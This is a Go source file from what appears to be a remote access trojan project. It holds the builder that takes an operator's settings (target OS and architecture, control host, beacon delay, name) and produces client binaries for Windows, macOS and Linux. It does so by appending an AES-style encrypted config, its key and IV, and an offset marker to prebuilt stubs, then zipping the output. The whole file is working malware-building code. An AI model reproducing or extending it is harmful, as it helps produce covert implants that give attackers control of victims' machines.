package build

import (
	"archive/zip"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"rat/common"
	"rat/common/crypto"
)

// Config is received from the websocket
type Config struct {
	TargetOS   string `json:"os"`
	TargetArch string `json:"arch"`
	Host       string `json:"host"`
	Delay      int    `json:"delay"`
	UPX        bool   `json:"upx"`
	Name       string `json:"name"`
}

type file struct {
	Name string
	Path string
}

func Build(c *Config, w io.Writer) (string, error) {
	fmt.Println("Starting build...")
	fmt.Println("Target OS:", c.TargetOS)
	fmt.Println("Target Arch:", c.TargetArch)
	fmt.Println(*c)

	var oss []string
	var archs []string

	if c.TargetOS == "all" {
		oss = []string{"windows", "macos", "linux"}
	} else {
		oss = []string{c.TargetOS}
	}

	if c.TargetArch == "all" {
		archs = []string{"amd64", "386"}
	} else {
		archs = []string{c.TargetArch}
	}

	config := common.BinaryConfig{
		Host:  c.Host,
		Delay: c.Delay,
		Name:  c.Name,
	}

	fmt.Println("Encoded config:", config)

	encoded, err := json.Marshal(&config)
	if err != nil {
		return "", err
	}

	var files []file

	for _, ost := range oss {
		for _, arch := range archs {
			ext := ""
			if ost == "windows" {
				ext = ".exe"
			}
			if arch == "386" {
				arch = "x86"
			}

			bin, err := os.OpenFile("bin/"+ost+"_"+arch+ext, os.O_RDONLY, 0777)
			defer bin.Close()
			if err != nil {
				continue
			}

			temp, err := ioutil.TempFile("", "build")
			if err != nil {
				return "", err
			}

			binName := ost + "_" + arch + ext

			files = append(files, file{binName, temp.Name()})

			fmt.Println(temp.Name())

			io.Copy(temp, bin)

			stat, err := bin.Stat()
			if err != nil {
				return "", err
			}

			offset := int32(stat.Size()) // 32 bit integer

			fmt.Println("Offset:", offset)

			key := crypto.GenerateKey()
			iv := crypto.GenerateIv()

			temp.Write(crypto.Encrypt(encoded, key, iv))

			temp.Write(key)
			temp.Write(iv)
			binary.Write(temp, common.ByteOrder, offset) // write offset as int32 (4 bytes)

			temp.Close()
		}
	}

	// One file was built
	if len(files) == 1 {
		return files[0].Path, nil
	}

	tz, _ := ioutil.TempFile("", "zip")
	z := zip.NewWriter(tz)

	for _, file := range files {
		f, err := z.Create(file.Name)
		if err != nil {
			log.Fatal(err)
		}
		tt, _ := os.Open(file.Path)
		_, err = io.Copy(f, tt)
		if err != nil {
			log.Fatal(err)
		}
	}

	z.Close()
	tz.Close()

	fmt.Println(tz.Name())

	return tz.Name(), nil
}
